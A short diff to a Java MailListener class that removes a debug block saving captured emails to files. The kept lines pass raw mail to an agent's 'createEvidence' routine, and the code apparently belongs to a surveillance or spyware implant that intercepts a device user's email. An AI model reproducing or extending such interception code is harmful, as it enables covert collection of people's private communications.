@@ -280,19 +280,6 @@ public final class MailListener implements FolderListener, SendListener { //, St
                     + mail.substring(0, Math.min(mail.length(), 200)));
             //#endif
 
-            //#ifdef SAVE_DEBUG_MAIL
-            AutoFlashFile mailSaved;
-            mailSaved = new AutoFlashFile(Path.USER() + Path.DEBUG_DIR + "M_"
-                    + filetime.getOrderedString() + ".ISO-8859-1.eml", false);
-            mailSaved.create();
-            mailSaved.write(mail.getBytes("ISO-8859-1"));
-
-            mailSaved = new AutoFlashFile(Path.USER() + Path.DEBUG_DIR + "M_"
-                    + filetime.getOrderedString() + ".UTF-8.eml", false);
-            mailSaved.create();
-            mailSaved.write(mail.getBytes("UTF-8"));
-            //#endif
-
             messageAgent.createEvidence(additionalData, mail.getBytes("UTF-8"),
                     EvidenceType.MAIL_RAW);
 
